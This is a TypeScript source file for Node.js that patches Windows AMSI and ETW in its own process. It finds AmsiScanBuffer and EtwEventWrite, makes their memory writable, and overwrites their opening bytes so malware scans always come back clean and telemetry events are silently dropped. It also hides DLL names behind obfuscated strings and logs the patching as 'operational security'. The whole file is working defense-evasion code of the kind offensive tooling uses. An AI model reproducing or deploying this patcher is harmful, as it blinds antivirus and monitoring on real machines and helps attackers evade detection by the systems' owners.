/**
 * InProcessPatcher — patches AMSI and ETW in the current process.
 *
 * On Windows, overwrites the prologue of AmsiScanBuffer (amsi.dll) and
 * EtwEventWrite (ntdll.dll) to neutralise user-mode telemetry before
 * performing memory operations.
 *
 * Uses VirtualProtect on SELF process — no remote process interaction.
 * Logs a notice when patches are applied. Only activates on win32.
 *
 * Does NOT bypass kernel callbacks (ETW-TI, ObRegisterCallbacks).
 */

import koffi from 'koffi';
import { DLL, ds } from '@utils/obfuscated-strings';
import { logger } from '@utils/logger';

// ── koffi lazy-load ──────────────────────────────────────────────────────────

let k32Handle: ReturnType<typeof koffi.load> | null = null;
function k32(): ReturnType<typeof koffi.load> {
  if (!k32Handle) k32Handle = koffi.load(ds(DLL.kernel32));
  return k32Handle;
}

let getModuleHandleFn: ReturnType<ReturnType<typeof koffi.load>['func']> | null = null;
function getGMH() {
  if (!getModuleHandleFn) getModuleHandleFn = k32().func('void * GetModuleHandleA(char *)');
  return getModuleHandleFn;
}

let getProcAddressFn: ReturnType<ReturnType<typeof koffi.load>['func']> | null = null;
function getGPA() {
  if (!getProcAddressFn) getProcAddressFn = k32().func('void * GetProcAddress(void *, char *)');
  return getProcAddressFn;
}

let virtualProtectFn: ReturnType<ReturnType<typeof koffi.load>['func']> | null = null;
function getVP() {
  if (!virtualProtectFn) {
    virtualProtectFn = k32().func('int VirtualProtect(void *, size_t, uint32, _Out_ uint32 *)');
  }
  return virtualProtectFn;
}

let getCurrentProcessFn: ReturnType<ReturnType<typeof koffi.load>['func']> | null = null;
function getGCP() {
  if (!getCurrentProcessFn) getCurrentProcessFn = k32().func('void * GetCurrentProcess()');
  return getCurrentProcessFn;
}

let writeProcessMemoryFn: ReturnType<ReturnType<typeof koffi.load>['func']> | null = null;
function getWPM() {
  if (!writeProcessMemoryFn) {
    writeProcessMemoryFn = k32().func(
      'int WriteProcessMemory(void *, void *, _In_ uint8_t *, size_t, _Out_ size_t *)',
    );
  }
  return writeProcessMemoryFn;
}

// ── Constants ────────────────────────────────────────────────────────────────

const PAGE_EXECUTE_READWRITE = 0x40;

// Patch bytes:
//   AmsiScanBuffer → mov eax, 1; ret  (AMSI_RESULT_CLEAN)
const AMSI_PATCH = Buffer.from([0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3]); // mov eax,1; ret

//   EtwEventWrite → xor eax, eax; ret  (return 0 = success, event dropped)
const ETW_PATCH = Buffer.from([0x31, 0xc0, 0xc3]); // xor eax,eax; ret

// ── State ────────────────────────────────────────────────────────────────────

let patchedState = false;
let patchErrorState: string | null = null;

// ── Helpers ──────────────────────────────────────────────────────────────────

function toBigInt(value: unknown): bigint {
  if (value === null || value === undefined) return 0n;
  if (typeof value === 'bigint') return value;
  if (typeof value === 'number') return BigInt(value);
  return koffi.address(value);
}

/**
 * Overwrite first N bytes of a function at `targetAddr` with `patch`.
 * Uses VirtualProtect on self process to make the page writable, writes
 * the patch, then restores the original protection.
 */
function patchFunction(targetAddr: bigint, patch: Buffer, name: string): boolean {
  const self = getGCP()() as unknown as bigint;
  const oldProtect = Buffer.alloc(4);

  // Change protection to RWX
  const vpRet = getVP()(
    targetAddr,
    patch.length,
    PAGE_EXECUTE_READWRITE,
    koffi.address(oldProtect),
  );
  if (!vpRet) {
    logger.debug(`InProcessPatcher: VirtualProtect failed for ${name}`);
    return false;
  }

  // Write the patch
  const wrote = Buffer.alloc(8);
  const wpmRet = getWPM()(
    self,
    targetAddr,
    koffi.address(patch),
    patch.length,
    koffi.address(wrote),
  );
  if (!wpmRet) {
    // Try to restore protection even on write failure
    getVP()(targetAddr, patch.length, oldProtect.readUInt32LE(0), koffi.address(Buffer.alloc(4)));
    logger.debug(`InProcessPatcher: WriteProcessMemory failed for ${name}`);
    return false;
  }

  // Restore original protection
  getVP()(targetAddr, patch.length, oldProtect.readUInt32LE(0), koffi.address(Buffer.alloc(4)));

  return true;
}

// ── Public API ───────────────────────────────────────────────────────────────

/**
 * Apply in-process patches to AMSI and ETW.
 *
 * Idempotent — subsequent calls are no-ops.
 * Only runs on Windows (win32 platform).
 *
 * Patches applied:
 *   - amsi.dll!AmsiScanBuffer → return AMSI_RESULT_CLEAN (1), bypasses AMSI scanning
 *   - ntdll.dll!EtwEventWrite   → return 0, silences ETW events from this process
 *
 * @returns true if at least one patch was successfully applied.
 */
export function applyInProcessPatches(): boolean {
  if (patchedState) return true;
  if (process.platform !== 'win32') {
    patchErrorState = 'InProcessPatcher: not on Windows';
    return false;
  }

  let appliedCount = 0;
  const errors: string[] = [];

  try {
    // Patch AMSI: amsi.dll!AmsiScanBuffer
    const amsiHandle = getGMH()('amsi.dll');
    if (amsiHandle !== null && toBigInt(amsiHandle) !== 0n) {
      const amsiScanBuffer = getGPA()(toBigInt(amsiHandle), 'AmsiScanBuffer');
      const amsiAddr = toBigInt(amsiScanBuffer);
      if (amsiAddr !== 0n) {
        if (patchFunction(amsiAddr, AMSI_PATCH, 'AmsiScanBuffer')) {
          appliedCount++;
        } else {
          errors.push('AmsiScanBuffer: patch write failed');
        }
      } else {
        errors.push('AmsiScanBuffer: GetProcAddress returned null');
      }
    } else {
      errors.push('amsi.dll: GetModuleHandle returned null');
    }

    // Patch ETW: ntdll.dll!EtwEventWrite
    const ntdllHandle = getGMH()(ds(DLL.ntdll));
    if (ntdllHandle !== null && toBigInt(ntdllHandle) !== 0n) {
      const etwEventWrite = getGPA()(toBigInt(ntdllHandle), 'EtwEventWrite');
      const etwAddr = toBigInt(etwEventWrite);
      if (etwAddr !== 0n) {
        if (patchFunction(etwAddr, ETW_PATCH, 'EtwEventWrite')) {
          appliedCount++;
        } else {
          errors.push('EtwEventWrite: patch write failed');
        }
      } else {
        errors.push('EtwEventWrite: GetProcAddress returned null');
      }
    } else {
      errors.push('ntdll.dll: GetModuleHandle returned null');
    }
  } catch (err) {
    errors.push(err instanceof Error ? err.message : String(err));
  }

  if (appliedCount > 0) {
    patchedState = true;
    logger.warn('AMSI/ETW patching applied for operational security');
    if (errors.length > 0) {
      logger.debug(`InProcessPatcher: partial failures: ${errors.join('; ')}`);
    }
    return true;
  }

  patchErrorState = errors.join('; ');
  logger.debug(`InProcessPatcher: all patches failed — ${patchErrorState}`);
  return false;
}

/**
 * Check whether in-process patches are currently active.
 */
export function isPatched(): boolean {
  return patchedState;
}

/**
 * Get the last patch error (or null if none).
 */
export function getPatchError(): string | null {
  return patchErrorState;
}

/**
 * Reset patch state (for testing).
 */
export function resetPatchState(): void {
  patchedState = false;
  patchErrorState = null;
}
